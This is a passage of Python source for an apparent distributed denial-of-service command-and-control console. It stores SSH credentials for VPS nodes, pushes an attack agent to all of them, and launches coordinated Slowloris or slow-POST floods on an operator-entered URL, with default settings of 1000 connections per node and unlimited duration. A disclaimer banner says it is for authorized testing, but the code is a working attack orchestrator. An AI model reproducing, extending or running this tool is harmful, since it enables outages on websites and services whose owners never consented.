                print(f"{Colors.YELLOW}PARTIAL ({remaining_procs} remaining){Colors.RESET}")
                stop_count += 1  # Still count as attempt
            else:
                print(f"{Colors.RED}FAILED{Colors.RESET}")
        
        # Update session status
        self.active_attacks[session_id]['status'] = 'stopped'
        self.active_attacks[session_id]['end_time'] = datetime.now()
        self.db_manager.update_session_status(session_id, 'stopped', datetime.now().isoformat())
        
        print(f"\n{Colors.GREEN}[SUCCESS] Stop command sent to {stop_count}/{len(vps_list)} VPS nodes{Colors.RESET}")
        return True, f"Attack stopped on {stop_count} nodes"
    
    def get_attack_status(self, session_id):
        """Enhanced attack status with better process detection"""
        if session_id not in self.active_attacks:
            return {}
        
        vps_list = self.active_attacks[session_id]['vps_list']
        status = {}
        
        for vps_ip in vps_list:
            # Multiple commands to detect running processes
            commands = [
                "ps aux | grep 'python3.*agent.py' | grep -v grep | wc -l",
                "pgrep -f 'agent.py' 2>/dev/null | wc -l",
                "netstat -an 2>/dev/null | grep ESTABLISHED | wc -l"
            ]
            
            active_processes = 0
            established_connections = 0
            
            for i, cmd in enumerate(commands):
                success, output = self.ssh_manager.execute_command(vps_ip, cmd)
                if success and output.strip().isdigit():
                    value = int(output.strip())
                    if i < 2:  # Process count commands
                        active_processes = max(active_processes, value)
                    else:  # Network connections
                        established_connections = value
            
            # Get additional system info if processes are running
            cpu_usage = ""
            memory_usage = ""
            if active_processes > 0:
                cpu_cmd = "top -bn1 | grep 'python3' | head -1 | awk '{print $9}'"
                success, output = self.ssh_manager.execute_command(vps_ip, cpu_cmd)
                if success and output.strip():
                    cpu_usage = f" (CPU: {output.strip()}%)"
                
                mem_cmd = "free | grep Mem | awk '{print $3/$2 * 100.0}'"
                success, output = self.ssh_manager.execute_command(vps_ip, mem_cmd)
                if success and output.strip():
                    memory_usage = f" (Mem: {float(output.strip()):.1f}%)"
            
            status[vps_ip] = {
                'active_processes': active_processes,
                'status': 'attacking' if active_processes > 0 else 'idle',
                'connections_info': f"({established_connections} conns)" if established_connections > 0 else "",
                'cpu_info': cpu_usage,
                'memory_info': memory_usage
            }
        
        return status

class SlowHTTPTUI:
    def __init__(self):
        self.security_manager = SecurityManager()
        self.db_manager = DatabaseManager()
        self.ssh_manager = SSHManager(self.security_manager)
        self.attack_manager = AttackManager(self.ssh_manager, self.db_manager)
        self.running = True
        
        # Handle Ctrl+C gracefully
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)
    
    def _signal_handler(self, sig, frame):
        print(f"\n{Colors.YELLOW}[EXIT] Shutting down C2 server...{Colors.RESET}")
        
        # Stop all active attacks
        for session_id in list(self.attack_manager.active_attacks.keys()):
            self.attack_manager.stop_attack(session_id)
        
        # Close SSH connections
        self.ssh_manager.close_all_connections()
        
        self.running = False
        print(f"{Colors.GREEN}Goodbye!{Colors.RESET}")
        sys.exit(0)
    
    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')
    
    def print_banner(self):
        banner = f"""{Colors.CYAN}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════════════════════╗
║                    DISTRIBUTED SLOW HTTP TESTING C2                         ║
║                        COMPLETE FIXED EDITION v3.0                          ║
╚══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.RED}{Colors.BOLD}⚠️  WARNING: FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY! ⚠️{Colors.RESET}
{Colors.RED}   Unauthorized use against systems you don't own is ILLEGAL!{Colors.RESET}

"""
        print(banner)
    
    def print_menu(self):
        menu = f"""
{Colors.BOLD}MAIN MENU:{Colors.RESET}
{Colors.GREEN}[1]{Colors.RESET} VPS Management
{Colors.GREEN}[2]{Colors.RESET} Launch Distributed Attack
{Colors.GREEN}[3]{Colors.RESET} Monitor Active Attacks  
{Colors.GREEN}[4]{Colors.RESET} Attack History & Logs
{Colors.GREEN}[5]{Colors.RESET} System Status
{Colors.GREEN}[6]{Colors.RESET} Advanced Options
{Colors.GREEN}[0]{Colors.RESET} Exit

{Colors.YELLOW}Select option (0-6): {Colors.RESET}"""
        print(menu)
    
    def input_with_prompt(self, prompt, required=True):
        while True:
            try:
                value = input(f"{Colors.CYAN}{prompt}{Colors.RESET}").strip()
                if not required or value:
                    return value
                print(f"{Colors.RED}This field is required{Colors.RESET}")
            except KeyboardInterrupt:
                return None
    
    def vps_management_menu(self):
        while self.running:
            self.clear_screen()
            self.print_banner()
            
            vps_list = self.db_manager.get_all_vps()
            
            print(f"{Colors.BOLD}VPS MANAGEMENT{Colors.RESET}")
            print("=" * 50)
            
            if vps_list:
                print(f"\n{'ID':<4} {'IP Address':<15} {'Username':<12} {'Status':<10} {'Location':<15} {'Last Seen'}")
                print("-" * 80)
                
                for vps in vps_list:
                    status_color = Colors.GREEN if vps[5] == 'online' else Colors.RED
                    last_seen = vps[7][:19] if vps[7] else 'Never'
                    location = vps[8] if vps[8] else 'Unknown'
                    
                    print(f"{vps[0]:<4} {vps[1]:<15} {vps[2]:<12} {status_color}{vps[5]:<10}{Colors.RESET} {location:<15} {last_seen}")
            else:
                print(f"\n{Colors.YELLOW}No VPS nodes configured{Colors.RESET}")
            
            menu = f"""
{Colors.BOLD}VPS OPERATIONS:{Colors.RESET}
{Colors.GREEN}[1]{Colors.RESET} Add VPS Node
{Colors.GREEN}[2]{Colors.RESET} Test All Connections
{Colors.GREEN}[3]{Colors.RESET} Deploy Unlimited Agents to All
{Colors.GREEN}[4]{Colors.RESET} Remove VPS Node
{Colors.GREEN}[5]{Colors.RESET} Test Single VPS
{Colors.GREEN}[0]{Colors.RESET} Back to Main Menu

{Colors.YELLOW}Select option (0-5): {Colors.RESET}"""
            
            print(menu)
            choice = input().strip()
            
            if choice == '1':
                self.add_vps()
            elif choice == '2':
                self.test_all_connections()
            elif choice == '3':
                self.deploy_all_agents()
            elif choice == '4':
                self.remove_vps()
            elif choice == '5':
                self.test_single_vps()
            elif choice == '0':
                break
            else:
                print(f"{Colors.RED}Invalid option{Colors.RESET}")
                time.sleep(1)
    
    def add_vps(self):
        print(f"\n{Colors.BOLD}ADD NEW VPS NODE{Colors.RESET}")
        print("-" * 25)
        
        try:
            ip = self.input_with_prompt("IP Address: ")
            if not ip:
                return
            
            username = self.input_with_prompt("SSH Username: ")
            if not username:
                return
            
            password = self.input_with_prompt("SSH Password: ")
            if not password:
                return
            
            port = self.input_with_prompt("SSH Port (default 22): ", False) or "22"
            try:
                port = int(port)
            except ValueError:
                print(f"{Colors.RED}Invalid port number{Colors.RESET}")
                input("Press Enter to continue...")
                return
            
            location = self.input_with_prompt("Location (optional): ", False) or "Unknown"
            
            encrypted_password = self.security_manager.encrypt_password(password)
            
            vps_id = self.db_manager.add_vps(ip, username, encrypted_password, port, location)
            if vps_id:
                print(f"{Colors.GREEN}[SUCCESS] VPS added to database{Colors.RESET}")
                
                # Test connection
                print(f"{Colors.YELLOW}[INFO] Testing connection...{Colors.RESET}")
                success, message = self.ssh_manager.connect_vps(ip, username, encrypted_password, port)
                
                status = 'online' if success else 'offline'
                self.db_manager.update_vps_status(ip, status)
                
                if success:
                    print(f"{Colors.GREEN}[SUCCESS] Connection test passed{Colors.RESET}")
                else:
                    print(f"{Colors.RED}[ERROR] Connection test failed: {message}{Colors.RESET}")
            else:
                print(f"{Colors.RED}[ERROR] VPS already exists or database error{Colors.RESET}")
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
        
        input("Press Enter to continue...")
    
    def test_all_connections(self):
        """Enhanced connection testing with better error reporting"""
        vps_list = self.db_manager.get_all_vps()
        
        if not vps_list:
            print(f"{Colors.YELLOW}[INFO] No VPS nodes to test{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Colors.BOLD}TESTING ALL VPS CONNECTIONS{Colors.RESET}")
        print("=" * 40)
        
        success_count = 0
        failed_connections = []
        
        for vps in vps_list:
            ip, username, encrypted_password, port = vps[1], vps[2], vps[3], vps[4]
            status_color = Colors.GREEN if vps[5] == 'online' else Colors.RED
            status_text = vps[5]
            
            print(f"{Colors.CYAN}[TESTING] {ip}...{Colors.RESET} ", end="", flush=True)
            
            # Test connection
            success, message = self.ssh_manager.connect_vps(ip, username, encrypted_password, port)
            
            if success:
                print(f"{Colors.GREEN}SUCCESS{Colors.RESET}")
                success_count += 1
                self.db_manager.update_vps_status(ip, 'online')
            else:
                print(f"{Colors.RED}FAILED{Colors.RESET}")
                failed_connections.append(f"{ip}: {message}")
                self.db_manager.update_vps_status(ip, 'offline')
        
        print(f"\n{Colors.BOLD}CONNECTION TEST RESULTS{Colors.RESET}")
        print("=" * 40)
        print(f"{Colors.GREEN}[SUCCESS] {success_count} connections working{Colors.RESET}")
        
        if failed_connections:
            print(f"{Colors.RED}[FAILED] {len(failed_connections)} connections failed{Colors.RESET}")
            print("\nFailed connections:")
            for failure in failed_connections:
                print(f"  {failure}")
        
        input("\nPress Enter to continue...")
    
    def deploy_all_agents(self):
        """Deploy agents to all VPS nodes"""
        vps_list = self.db_manager.get_all_vps()
        
        if not vps_list:
            print(f"{Colors.YELLOW}[INFO] No VPS nodes configured{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Colors.BOLD}DEPLOYING AGENTS TO ALL VPS NODES{Colors.RESET}")
        print("=" * 50)
        
        success_count = 0
        failed_deployments = []
        
        for vps in vps_list:
            ip, username, encrypted_password, port = vps[1], vps[2], vps[3], vps[4]
            
            print(f"{Colors.CYAN}[DEPLOYING] {ip}...{Colors.RESET} ", end="", flush=True)
            
            # First ensure connection
            if not self.ssh_manager.get_connection_status(ip):
                print(f"{Colors.YELLOW}CONNECTING...{Colors.RESET} ", end="", flush=True)
                connect_success, connect_msg = self.ssh_manager.connect_vps(ip, username, encrypted_password, port)
                
                if not connect_success:
                    print(f"{Colors.RED}CONN_FAILED{Colors.RESET}")
                    failed_deployments.append(f"{ip}: Connection failed - {connect_msg}")
                    continue
                else:
                    print(f"{Colors.GREEN}CONNECTED{Colors.RESET} ", end="", flush=True)
            
            # Deploy agent
            deploy_success, deploy_msg = self.ssh_manager.deploy_agent(ip)
            
            if deploy_success:
                print(f"{Colors.GREEN}SUCCESS{Colors.RESET}")
                success_count += 1
                self.db_manager.update_vps_status(ip, 'online')
            else:
                print(f"{Colors.RED}FAILED{Colors.RESET}")
                failed_deployments.append(f"{ip}: {deploy_msg}")
                self.db_manager.update_vps_status(ip, 'offline')
        
        print(f"\n{Colors.BOLD}AGENT DEPLOYMENT RESULTS{Colors.RESET}")
        print("=" * 50)
        print(f"{Colors.GREEN}[SUCCESS] {success_count} agents deployed{Colors.RESET}")
        
        if failed_deployments:
            print(f"{Colors.RED}[FAILED] {len(failed_deployments)} deployments failed{Colors.RESET}")
            print("\nFailed deployments:")
            for failure in failed_deployments:
                print(f"  {failure}")
        
        input("\nPress Enter to continue...")
    
    def remove_vps(self):
        """Remove VPS node from database"""
        vps_list = self.db_manager.get_all_vps()
        
        if not vps_list:
            print(f"{Colors.YELLOW}[INFO] No VPS nodes configured{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Colors.BOLD}REMOVE VPS NODE{Colors.RESET}")
        print("=" * 30)
        
        print(f"\n{'ID':<4} {'IP Address':<15} {'Username':<12} {'Status':<10} {'Location':<15}")
        print("-" * 65)
        
        for vps in vps_list:
            status_color = Colors.GREEN if vps[5] == 'online' else Colors.RED
            location = vps[8] if vps[8] else 'Unknown'
            
            print(f"{vps[0]:<4} {vps[1]:<15} {vps[2]:<12} {status_color}{vps[5]:<10}{Colors.RESET} {location:<15}")
        
        try:
            choice = input(f"\n{Colors.CYAN}Enter VPS ID to remove (or 0 to cancel): {Colors.RESET}").strip()
            
            if choice == '0':
                return
            
            vps_id = int(choice)
            vps_to_remove = next((vps for vps in vps_list if vps[0] == vps_id), None)
            
            if vps_to_remove:
                ip = vps_to_remove[1]
                confirm = input(f"{Colors.YELLOW}Are you sure you want to remove VPS {ip}? (y/N): {Colors.RESET}").strip().lower()
                
                if confirm == 'y':
                    success = self.db_manager.remove_vps(ip)
                    
                    if success:
                        print(f"{Colors.GREEN}[SUCCESS] VPS {ip} removed from database{Colors.RESET}")
                        
                        # Also disconnect if connected
                        if self.ssh_manager.get_connection_status(ip):
                            self.ssh_manager.disconnect_vps(ip)
                    else:
                        print(f"{Colors.RED}[ERROR] Failed to remove VPS {ip}{Colors.RESET}")
                else:
                    print(f"{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
            else:
                print(f"{Colors.RED}[ERROR] Invalid VPS ID{Colors.RESET}")
                
        except ValueError:
            print(f"{Colors.RED}[ERROR] Invalid input{Colors.RESET}")
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
        
        input("Press Enter to continue...")
    
    def test_single_vps(self):
        """Test connection to a single VPS node"""
        vps_list = self.db_manager.get_all_vps()
        
        if not vps_list:
            print(f"{Colors.YELLOW}[INFO] No VPS nodes configured{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Colors.BOLD}TEST SINGLE VPS CONNECTION{Colors.RESET}")
        print("=" * 40)
        
        print(f"\n{'ID':<4} {'IP Address':<15} {'Username':<12} {'Status':<10} {'Location':<15}")
        print("-" * 65)
        
        for vps in vps_list:
            status_color = Colors.GREEN if vps[5] == 'online' else Colors.RED
            location = vps[8] if vps[8] else 'Unknown'
            
            print(f"{vps[0]:<4} {vps[1]:<15} {vps[2]:<12} {status_color}{vps[5]:<10}{Colors.RESET} {location:<15}")
        
        try:
            choice = input(f"\n{Colors.CYAN}Enter VPS ID to test (or 0 to cancel): {Colors.RESET}").strip()
            
            if choice == '0':
                return
            
            vps_id = int(choice)
            vps_to_test = next((vps for vps in vps_list if vps[0] == vps_id), None)
            
            if vps_to_test:
                ip, username, encrypted_password, port = vps_to_test[1], vps_to_test[2], vps_to_test[3], vps_to_test[4]
                
                print(f"\n{Colors.CYAN}[TESTING] {ip}...{Colors.RESET}")
                success, message = self.ssh_manager.connect_vps(ip, username, encrypted_password, port)
                
                if success:
                    print(f"{Colors.GREEN}[SUCCESS] Connection to {ip} established{Colors.RESET}")
                    self.db_manager.update_vps_status(ip, 'online')
                    
                    # Test command execution
                    print(f"{Colors.CYAN}[EXECUTING] Test command...{Colors.RESET}")
                    test_success, test_output = self.ssh_manager.execute_command(ip, "echo 'Test successful' && whoami")
                    
                    if test_success:
                        print(f"{Colors.GREEN}[SUCCESS] Command executed: {test_output.strip()}{Colors.RESET}")
                    else:
                        print(f"{Colors.RED}[ERROR] Command failed: {test_output}{Colors.RESET}")
                else:
                    print(f"{Colors.RED}[FAILED] Connection to {ip} failed: {message}{Colors.RESET}")
                    self.db_manager.update_vps_status(ip, 'offline')
            else:
                print(f"{Colors.RED}[ERROR] Invalid VPS ID{Colors.RESET}")
                
        except ValueError:
            print(f"{Colors.RED}[ERROR] Invalid input{Colors.RESET}")
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
        
        input("\nPress Enter to continue...")
    
    def launch_attack_menu(self):
        """Launch distributed attack menu"""
        vps_list = self.db_manager.get_all_vps()
        
        if not vps_list:
            print(f"{Colors.YELLOW}[INFO] No VPS nodes configured{Colors.RESET}")
            print(f"{Colors.YELLOW}[ACTION] Please add VPS nodes first{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        # Get attack parameters
        print(f"\n{Colors.BOLD}LAUNCH DISTRIBUTED ATTACK{Colors.RESET}")
        print("=" * 40)
        
        try:
            session_name = self.input_with_prompt("Session name: ")
            if not session_name:
                return
            
            target_url = self.input_with_prompt("Target URL: ")
            if not target_url:
                return
            
            # Select VPS nodes
            print(f"\n{Colors.BOLD}SELECT VPS NODES{Colors.RESET}")
            print("-" * 30)
            
            print(f"\n{'ID':<4} {'IP Address':<15} {'Username':<12} {'Status':<10}")
            print("-" * 50)
            
            for vps in vps_list:
                status_color = Colors.GREEN if vps[5] == 'online' else Colors.RED
                print(f"{vps[0]:<4} {vps[1]:<15} {vps[2]:<12} {status_color}{vps[5]:<10}{Colors.RESET}")
            
            vps_selection = input(f"\n{Colors.CYAN}Enter VPS IDs (comma-separated, or 'all' for all): {Colors.RESET}").strip()
            
            if vps_selection.lower() == 'all':
                selected_vps = [vps[1] for vps in vps_list]
            else:
                selected_ids = [int(id.strip()) for id in vps_selection.split(',')]
                selected_vps = [vps[1] for vps in vps_list if vps[0] in selected_ids]
            
            if not selected_vps:
                print(f"{Colors.RED}[ERROR] No VPS nodes selected{Colors.RESET}")
                input("Press Enter to continue...")
                return
            
            # Select attack type
            print(f"\n{Colors.BOLD}SELECT ATTACK TYPE{Colors.RESET}")
            print("-" * 30)
            print(f"{Colors.GREEN}[1]{Colors.RESET} Slowloris Attack (HTTP DoS)")
            print(f"{Colors.GREEN}[2]{Colors.RESET} Slow POST Attack (R.U.D.Y)")
            
            attack_choice = input(f"\n{Colors.CYAN}Select attack type (1-2): {Colors.RESET}").strip()
            
            if attack_choice == '1':
                attack_type = 'slowloris'
            elif attack_choice == '2':
                attack_type = 'slow_post'
            else:
                print(f"{Colors.RED}[ERROR] Invalid selection{Colors.RESET}")
                input("Press Enter to continue...")
                return
            
            # Get attack parameters
            print(f"\n{Colors.BOLD}ATTACK PARAMETERS{Colors.RESET}")
            print("-" * 30)
            
            try:
                connections = int(input(f"{Colors.CYAN}Connections per VPS (default 1000): {Colors.RESET}") or "1000")
                delay = int(input(f"{Colors.CYAN}Delay between packets in seconds (default 15): {Colors.RESET}") or "15")
                duration = int(input(f"{Colors.CYAN}Duration in seconds (0=unlimited, default 0): {Colors.RESET}") or "0")
                
                if connections < 1:
                    print(f"{Colors.RED}[ERROR] Connections must be at least 1{Colors.RESET}")
                    input("Press Enter to continue...")
                    return
                
                if delay < 0:
                    print(f"{Colors.RED}[ERROR] Delay cannot be negative{Colors.RESET}")
                    input("Press Enter to continue...")
                    return
                
            except ValueError:
                print(f"{Colors.RED}[ERROR] Invalid input{Colors.RESET}")
                input("Press Enter to continue...")
                return
            
            # Confirm launch
            print(f"\n{Colors.BOLD}ATTACK SUMMARY{Colors.RESET}")
            print("=" * 40)
            print(f"Session: {session_name}")
            print(f"Target: {target_url}")
            print(f"Attack Type: {attack_type}")
            print(f"VPS Nodes: {len(selected_vps)}")
            print(f"Connections per VPS: {connections}")
            print(f"Delay: {delay} seconds")
            print(f"Duration: {'Unlimited' if duration == 0 else f'{duration} seconds'}")
            
            confirm = input(f"\n{Colors.YELLOW}Launch attack? (y/N): {Colors.RESET}").strip().lower()
            
            if confirm != 'y':
                print(f"{Colors.YELLOW}[CANCELLED] Attack not launched{Colors.RESET}")
                input("Press Enter to continue...")
                return
            
            # Create session and launch attack
            session_id = self.db_manager.create_attack_session(
                session_name, target_url, "", attack_type, selected_vps, 
                {'connections': connections, 'delay': delay, 'duration': duration}
            )
            
            if session_id:
                print(f"\n{Colors.GREEN}[SUCCESS] Attack session created (ID: {session_id}){Colors.RESET}")
                
                # Launch the attack
                success = self.attack_manager.launch_attack(
                    session_id, target_url, attack_type, selected_vps,
                    {'connections': connections, 'delay': delay, 'duration': duration}
                )
                
                if success:
                    print(f"{Colors.GREEN}[SUCCESS] Attack launched successfully{Colors.RESET}")
                else:
                    print(f"{Colors.RED}[ERROR] Attack launch failed{Colors.RESET}")
                    # Update session status
                    self.db_manager.update_session_status(session_id, 'failed')
            else:
                print(f"{Colors.RED}[ERROR] Failed to create attack session{Colors.RESET}")
            
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
        
        input("Press Enter to continue...")
    
    def monitor_attacks_menu(self):
        """Monitor active attacks menu"""
        if not self.attack_manager.active_attacks:
            print(f"{Colors.YELLOW}[INFO] No active attacks{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Colors.BOLD}MONITOR ACTIVE ATTACKS{Colors.RESET}")
        print("=" * 40)
        
        while True:
            self.clear_screen()
            self.print_banner()
            
            print(f"\n{Colors.BOLD}ACTIVE ATTACKS{Colors.RESET}")
            print("-" * 40)
            
            for session_id, attack in self.attack_manager.active_attacks.items():
                duration = (datetime.now() - attack['start_time']).seconds
                duration_str = f"{duration//3600}h {(duration%3600)//60}m {duration%60}s"
                
                print(f"\n{Colors.CYAN}[SESSION {session_id}] {attack['session_name']}{Colors.RESET}")
                print(f"  Target: {attack['target_url']}")
                print(f"  Type: {attack['attack_type'].upper()}")
                print(f"  Nodes: {len(attack['vps_list'])}")
                print(f"  Duration: {duration_str}")
                print(f"  Status: {attack['status']}")
                
                # Get status for each VPS
                status = self.attack_manager.get_attack_status(session_id)
                
                for vps_ip in attack['vps_list']:
                    if vps_ip in status:
                        vps_status = status[vps_ip]
                        process_color = Colors.GREEN if vps_status['active_processes'] > 0 else Colors.RED
                        print(f"    {vps_ip}: {process_color}{vps_status['status']}{Colors.RESET} "
                              f"{vps_status['connections_info']} {vps_status['cpu_info']} {vps_status['memory_info']}")
            
            menu = f"""
{Colors.BOLD}MONITORING OPTIONS:{Colors.RESET}
{Colors.GREEN}[1]{Colors.RESET} Refresh Status
{Colors.GREEN}[2]{Colors.RESET} Stop Attack
{Colors.GREEN}[0]{Colors.RESET} Back to Main Menu

{Colors.YELLOW}Select option (0-2): {Colors.RESET}"""
            
            print(menu)
            choice = input().strip()
            
            if choice == '1':
                continue  # Just refresh the display
            elif choice == '2':
                self.stop_attack_menu()
            elif choice == '0':
                break
            else:
                print(f"{Colors.RED}Invalid option{Colors.RESET}")
                time.sleep(1)
    
    def stop_attack_menu(self):
        """Stop attack menu"""
        if not self.attack_manager.active_attacks:
            print(f"{Colors.YELLOW}[INFO] No active attacks{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Colors.BOLD}STOP ATTACK{Colors.RESET}")
        print("=" * 30)
        
        for session_id, attack in self.attack_manager.active_attacks.items():
            print(f"\n{Colors.CYAN}[SESSION {session_id}] {attack['session_name']}{Colors.RESET}")
            print(f"  Target: {attack['target_url']}")
            print(f"  Type: {attack['attack_type'].upper()}")
            print(f"  Nodes: {len(attack['vps_list'])}")
            print(f"  Status: {attack['status']}")
        
        try:
            choice = input(f"\n{Colors.CYAN}Enter session ID to stop (or 0 to cancel): {Colors.RESET}").strip()
            
            if choice == '0':
                return
            
            session_id = int(choice)
            
            if session_id in self.attack_manager.active_attacks:
                confirm = input(f"{Colors.YELLOW}Stop attack session {session_id}? (y/N): {Colors.RESET}").strip().lower()
                
                if confirm == 'y':
                    success, message = self.attack_manager.stop_attack(session_id)
                    
                    if success:
                        print(f"{Colors.GREEN}[SUCCESS] {message}{Colors.RESET}")
                    else:
                        print(f"{Colors.RED}[ERROR] Failed to stop attack: {message}{Colors.RESET}")
                else:
                    print(f"{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
            else:
                print(f"{Colors.RED}[ERROR] Invalid session ID{Colors.RESET}")
                
        except ValueError:
            print(f"{Colors.RED}[ERROR] Invalid input{Colors.RESET}")
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
        
        input("Press Enter to continue...")
    
    def attack_history_menu(self):
        """Display attack history and logs"""
        sessions = self.db_manager.get_attack_sessions()
        
        if not sessions:
            print(f"{Colors.YELLOW}[INFO] No attack history found{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Colors.BOLD}ATTACK HISTORY & LOGS{Colors.RESET}")
        print("=" * 40)
        
        # Display sessions
        for session in sessions:
            session_id, session_name, target_url, attack_type, status, start_time, end_time = session[0], session[1], session[2], session[4], session[8], session[6], session[7]
            
            # Calculate duration
            if start_time and end_time:
                start = datetime.fromisoformat(start_time)
                end = datetime.fromisoformat(end_time)
                duration = str(end - start).split('.')[0]  # Remove microseconds
            else:
                duration = "N/A"
            
            # Status color
            status_color = Colors.GREEN if status == 'completed' else Colors.YELLOW if status == 'running' else Colors.RED
            
            print(f"\n{Colors.CYAN}[SESSION {session_id}] {session_name}{Colors.RESET}")
            print(f"  Target: {target_url}")
            print(f"  Type: {attack_type.upper()}")
            print(f"  Status: {status_color}{status.upper()}{Colors.RESET}")
            print(f"  Started: {start_time[:19] if start_time else 'N/A'}")
            print(f"  Duration: {duration}")
            
            # Show logs for this session
            print(f"\n{Colors.BOLD}ATTACK LOGS:{Colors.RESET}")
            print("-" * 30)
            
            conn = sqlite3.connect(self.db_manager.db_file)
            cursor = conn.cursor()
            cursor.execute('''
                SELECT timestamp, log_level, message FROM attack_logs 
                WHERE session_id = ? ORDER BY timestamp DESC LIMIT 10
            ''', (session_id,))
            
            logs = cursor.fetchall()
            conn.close()
            
            if logs:
                for log in logs:
                    timestamp, level, message = log
                    level_color = Colors.RED if level == 'ERROR' else Colors.YELLOW if level == 'WARNING' else Colors.GREEN
                    print(f"  {timestamp[:19]} {level_color}[{level}]{Colors.RESET} {message}")
            else:
                print(f"  {Colors.YELLOW}No logs found for this session{Colors.RESET}")
        
        input("\nPress Enter to continue...")
    
    def system_status_menu(self):
        """Display system status"""
        self.clear_screen()
        self.print_banner()
        
        print(f"\n{Colors.BOLD}SYSTEM STATUS{Colors.RESET}")
        print("=" * 40)
        
        # VPS status
        vps_list = self.db_manager.get_all_vps()
        online_vps = sum(1 for vps in vps_list if vps[5] == 'online')
        
        print(f"\n{Colors.CYAN}VPS NODES:{Colors.RESET}")
        print(f"  Total: {len(vps_list)}")
        print(f"  Online: {Colors.GREEN}{online_vps}{Colors.RESET}")
        print(f"  Offline: {Colors.RED}{len(vps_list) - online_vps}{Colors.RESET}")
        
        # Active attacks
        active_attacks = len(self.attack_manager.active_attacks)
        
        print(f"\n{Colors.CYAN}ACTIVE ATTACKS:{Colors.RESET}")
        print(f"  Total: {active_attacks}")
        
        if active_attacks > 0:
            print(f"\n{Colors.CYAN}CURRENT ATTACKS:{Colors.RESET}")
            for session_id, attack in self.attack_manager.active_attacks.items():
                duration = (datetime.now() - attack['start_time']).seconds
                duration_str = f"{duration//3600}h {(duration%3600)//60}m {duration%60}s"
                
                print(f"  {session_id}: {attack['session_name']} ({duration_str})")
        
        # Database status
        db_file = self.db_manager.db_file
        db_exists = os.path.exists(db_file)
        db_size = os.path.getsize(db_file) if db_exists else 0
        
        print(f"\n{Colors.CYAN}DATABASE:{Colors.RESET}")
        print(f"  Status: {Colors.GREEN}OK{Colors.RESET}" if db_exists else f"{Colors.RED}MISSING{Colors.RESET}")
        print(f"  Size: {db_size:,} bytes")
        
        # Attack logs summary
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute('SELECT COUNT(*) FROM attack_logs')
        total_logs = cursor.fetchone()[0]
        conn.close()
        
        print(f"\n{Colors.CYAN}ATTACK LOGS:{Colors.RESET}")
        print(f"  Total entries: {total_logs}")
        
        input("\nPress Enter to continue...")
    
    def advanced_options_menu(self):
        """Advanced options menu"""
        while self.running:
            self.clear_screen()
            self.print_banner()
            
            print(f"\n{Colors.BOLD}ADVANCED OPTIONS{Colors.RESET}")
            print("=" * 40)
            
            menu = f"""
{Colors.BOLD}DATABASE MANAGEMENT:{Colors.RESET}
{Colors.GREEN}[1]{Colors.RESET} Backup Database
{Colors.GREEN}[2]{Colors.RESET} Clear Attack Logs
{Colors.GREEN}[3]{Colors.RESET} Reset Database

{Colors.BOLD}SYSTEM MANAGEMENT:{Colors.RESET}
{Colors.GREEN}[4]{Colors.RESET} Clear All SSH Connections
{Colors.GREEN}[5]{Colors.RESET} Force Stop All Attacks
{Colors.GREEN}[6]{Colors.RESET} Generate Security Report

{Colors.GREEN}[0]{Colors.RESET} Back to Main Menu

{Colors.YELLOW}Select option (0-6): {Colors.RESET}"""
            
            print(menu)
            choice = input().strip()
            
            if choice == '1':
                self.backup_database()
            elif choice == '2':
                self.clear_attack_logs()
            elif choice == '3':
                self.reset_database()
            elif choice == '4':
                self.clear_ssh_connections()
            elif choice == '5':
                self.force_stop_all_attacks()
            elif choice == '6':
                self.generate_security_report()
            elif choice == '0':
                break
            else:
                print(f"{Colors.RED}Invalid option{Colors.RESET}")
                time.sleep(1)
    
    def backup_database(self):
        """Create a backup of the database"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            backup_file = f"c2_database_backup_{timestamp}.db"
            
            # Copy database file
            import shutil
            shutil.copy2(self.db_manager.db_file, backup_file)
            
            print(f"{Colors.GREEN}[SUCCESS] Database backed up to {backup_file}{Colors.RESET}")
            print(f"Backup size: {os.path.getsize(backup_file):,} bytes")
            
        except Exception as e:
            print(f"{Colors.RED}[ERROR] Failed to backup database: {str(e)}{Colors.RESET}")
        
        input("Press Enter to continue...")
    
    def clear_attack_logs(self):
        """Clear all attack logs"""
        try:
            conn = sqlite3.connect(self.db_manager.db_file)
            cursor = conn.cursor()
            cursor.execute('DELETE FROM attack_logs')
            conn.commit()
            conn.close()
            
            print(f"{Colors.GREEN}[SUCCESS] All attack logs cleared{Colors.RESET}")
            
        except Exception as e:
            print(f"{Colors.RED}[ERROR] Failed to clear logs: {str(e)}{Colors.RESET}")
        
        input("Press Enter to continue...")
    
    def reset_database(self):
        """Reset the entire database"""
        try:
            confirm = input(f"{Colors.RED}WARNING: This will delete ALL data! Are you sure? (y/N): {Colors.RESET}").strip().lower()
            
            if confirm == 'y':
                # Remove database file
                if os.path.exists(self.db_manager.db_file):
                    os.remove(self.db_manager.db_file)
                
                # Reinitialize database
